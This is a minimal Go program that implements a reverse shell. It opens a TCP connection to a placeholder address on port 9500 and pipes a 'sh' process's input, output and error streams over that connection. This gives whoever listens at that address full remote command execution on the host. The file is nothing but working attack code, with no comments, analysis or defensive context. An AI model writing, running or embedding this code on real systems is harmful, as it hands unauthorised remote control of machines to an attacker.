package main

import (
  "os/exec"
  "net"
)

func main(){
  c , _ := net.Dial("tcp","00.00.00.00:9500");
  
  cmd := exec.Command("sh");
    cmd.Stdin  = c;
    cmd.Stdout = c;
    cmd.Stderr = c;
    cmd.Run();
}
